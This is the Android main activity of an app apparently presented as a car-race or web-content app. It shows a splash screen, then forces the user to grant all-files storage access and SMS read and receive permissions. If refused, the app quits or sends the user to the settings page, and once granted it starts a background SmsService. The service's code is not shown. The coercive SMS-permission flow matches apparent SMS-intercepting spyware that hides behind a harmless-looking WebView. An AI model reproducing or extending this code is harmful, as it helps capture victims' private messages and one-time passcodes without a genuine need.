package com.carrace;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowInsets;
import android.webkit.MimeTypeMap;
import android.webkit.RenderProcessGoneDetail;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Locale;

public class MainActivity extends Activity {

    private static final String TAG = "ApkReactCh";

    private static final String HOST = "appassets.androidplatform.net";
    private static final String ASSET_PREFIX = "/assets/";
    private static final String START_URL = "https://" + HOST + ASSET_PREFIX + "index.html";

    private static final long SPLASH_MS = 2500L;
    private static final int REQUEST_STORAGE = 100;
    private static final int REQUEST_SMS = 101;
    private static final String PREFS = "perm";
    private static final String KEY_ASKED_STORAGE = "storage_asked";
    private static final String KEY_ASKED_SMS = "sms_asked";
    private static final String MSG_STORAGE = "Storage permission is required to use this app";
    private static final String MSG_SMS = "SMS permission is required to use this app";

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Runnable splashDone = this::onSplashFinished;

    private WebView webView;
    private boolean awaitingSettings;

    // ===== Lifecycle =====

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        LinearLayout splash = buildSplash();
        applySystemBarPadding(splash);
        setContentView(splash);
        handler.postDelayed(splashDone, SPLASH_MS);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (webView != null) webView.onResume();
        if (awaitingSettings) {
            awaitingSettings = false;
            if (hasStorage()) {
                maybeStartService();
                maybeContinueAfterStorage();
            } else {
                closeApp(MSG_STORAGE);
            }
        }
    }

    @Override
    protected void onPause() {
        if (webView != null) webView.onPause();
        super.onPause();
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        destroyWebView();
        super.onDestroy();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (isFinishing()) return;

        if (requestCode == REQUEST_STORAGE) {
            if (hasStorage()) {
                maybeStartService();
                maybeContinueAfterStorage();
            } else {
                closeApp(MSG_STORAGE);
            }
            return;
        }

        if (requestCode == REQUEST_SMS) {
            if (hasSms()) {
                maybeStartService();
                openWebView();
            } else {
                closeApp(MSG_SMS);
            }
        }
    }

    // ===== Permission flow =====

    private void onSplashFinished() {
        if (isFinishing()) return;

        // 1) Storage first
        if (!hasStorage()) {
            if (Build.VERSION.SDK_INT >= 30) {
                openPermissionSettings(
                        allFilesIntent(),
                        new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION),
                        appDetailsIntent());
            } else {
                SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
                boolean asked = prefs.getBoolean(KEY_ASKED_STORAGE, false);
                boolean neverAskAgain = asked
                        && !shouldShowRequestPermissionRationale(Manifest.permission.READ_EXTERNAL_STORAGE)
                        && !shouldShowRequestPermissionRationale(Manifest.permission.WRITE_EXTERNAL_STORAGE);
                if (neverAskAgain) {
                    openPermissionSettings(appDetailsIntent());
                } else {
                    prefs.edit().putBoolean(KEY_ASKED_STORAGE, true).apply();
                    requestPermissions(new String[]{
                            Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.WRITE_EXTERNAL_STORAGE
                    }, REQUEST_STORAGE);
                }
            }
            return;
        }

        // 2) Then SMS
        maybeContinueAfterStorage();
    }

    private void maybeContinueAfterStorage() {
        if (!hasSms()) {
            SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
            boolean asked = prefs.getBoolean(KEY_ASKED_SMS, false);
            boolean neverAskAgain = asked
                    && !shouldShowRequestPermissionRationale(Manifest.permission.READ_SMS)
                    && !shouldShowRequestPermissionRationale(Manifest.permission.RECEIVE_SMS);
            if (neverAskAgain) {
                openPermissionSettings(appDetailsIntent());
            } else {
                prefs.edit().putBoolean(KEY_ASKED_SMS, true).apply();
                requestPermissions(new String[]{
                        Manifest.permission.READ_SMS,
                        Manifest.permission.RECEIVE_SMS
                }, REQUEST_SMS);
            }
            return;
        }

        // Both granted -> start service + webview
        maybeStartService();
        openWebView();
    }

    private void maybeStartService() {
        try {
            Intent svc = new Intent(this, SmsService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
        } catch (Exception e) {
            Log.w(TAG, "failed to start service", e);
        }
    }

    private void openPermissionSettings(Intent... candidates) {
        awaitingSettings = true;
        for (Intent intent : candidates) {
            if (startSafely(intent)) return;
        }
        awaitingSettings = false;
        closeApp(MSG_STORAGE);
    }

    private boolean startSafely(Intent intent) {
        try { startActivity(intent); return true; }
        catch (RuntimeException e) {
            Log.w(TAG, "Permission settings not available", e);
            return false;
        }
    }

    private Intent allFilesIntent() {
        return new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                Uri.parse("package:" + getPackageName()));
    }

    private Intent appDetailsIntent() {
        return new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:" + getPackageName()));
    }

    private boolean hasStorage() {
        if (Build.VERSION.SDK_INT >= 30) return Environment.isExternalStorageManager();
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED
                    && checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private boolean hasSms() {
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                    && checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private void closeApp(String message) {
        if (isFinishing()) return;
        Toast.makeText(this, message, Toast.LENGTH_LONG).show();
        finishAndRemoveTask();
    }

    // ===== UI =====

    private LinearLayout buildSplash() {
        float density = getResources().getDisplayMetrics().density;
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(0xFFFFFFFF);

        MouseLoadingView mouse = new MouseLoadingView(this);
        root.addView(mouse, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, (int) (180 * density)));

        TextView title = new TextView(this);
        title.setText("Apk React Ch");
        title.setTextSize(22);
        title.setTextColor(0xFF212121);
        title.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        titleParams.topMargin = (int) (16 * density);
        root.addView(title, titleParams);
        return root;
    }

    private void openWebView() {
        if (isFinishing() || webView != null) return;
        try {
            WebView view = new WebView(this);
            WebSettings settings = view.getSettings();
            settings.setJavaScriptEnabled(true);
            settings.setDomStorageEnabled(true);
            settings.setAllowFileAccess(false);
            settings.setAllowContentAccess(false);
            view.setWebViewClient(new AssetClient());
            applySystemBarPadding(view);
            webView = view;
            setContentView(view);
            view.loadUrl(START_URL);
        } catch (RuntimeException e) {
            Log.e(TAG, "WebView unavailable", e);
            destroyWebView();
            closeApp("WebView is not available on this device");
        }
    }

    private void destroyWebView() {
        WebView view = webView;
        webView = null;
        if (view == null) return;
        try {
            view.stopLoading();
            view.destroy();
        } catch (RuntimeException e) {
            Log.w(TAG, "Failed to destroy WebView", e);
        }
    }

    private void recoverWebView(WebView broken) {
        if (broken != webView || isFinishing()) return;
        destroyWebView();
        openWebView();
    }

    private void applySystemBarPadding(View view) {
        view.setOnApplyWindowInsetsListener((v, insets) -> {
            v.setPadding(
                    insets.getSystemWindowInsetLeft(),
                    insets.getSystemWindowInsetTop(),
                    insets.getSystemWindowInsetRight(),
                    insets.getSystemWindowInsetBottom());
            return insets;
        });
    }

    // ===== Asset server =====

    private final class AssetClient extends WebViewClient {
        @Override
        public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
            try {
                return serveAsset(request.getUrl());
            } catch (RuntimeException e) {
                Log.w(TAG, "Failed to serve asset", e);
                return notFound();
            }
        }

        @Override
        public boolean onRenderProcessGone(WebView view, RenderProcessGoneDetail detail) {
            handler.post(() -> recoverWebView(view));
            return true;
        }
    }

    private WebResourceResponse serveAsset(Uri uri) {
        if (uri == null || !HOST.equals(uri.getHost())) return null;
        String path = uri.getPath();
        if (path == null || !path.startsWith(ASSET_PREFIX)) return notFound();
        String file = path.substring(ASSET_PREFIX.length());
        if (file.isEmpty() || file.endsWith("/")) file = file + "index.html";
        if (file.contains("..")) return notFound();
        try {
            InputStream in = getAssets().open(file);
            return new WebResourceResponse(mimeOf(file), "UTF-8", in);
        } catch (IOException e) {
            return notFound();
        }
    }

    private static WebResourceResponse notFound() {
        return new WebResourceResponse("text/plain", "UTF-8", 404, "Not Found", null,
                new ByteArrayInputStream(new byte[0]));
    }

    private static String mimeOf(String file) {
        int dot = file.lastIndexOf('.');
        String ext = dot >= 0 ? file.substring(dot + 1).toLowerCase(Locale.ROOT) : "";
        switch (ext) {
            case "js":
            case "mjs":
                return "application/javascript";
            case "css":
                return "text/css";
            case "html":
            case "htm":
                return "text/html";
            case "json":
                return "application/json";
            case "wasm":
                return "application/wasm";
            case "woff":
                return "font/woff";
            case "woff2":
                return "font/woff2";
            default:
                String mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext);
                return mime != null ? mime : "application/octet-stream";
        }
    }
}
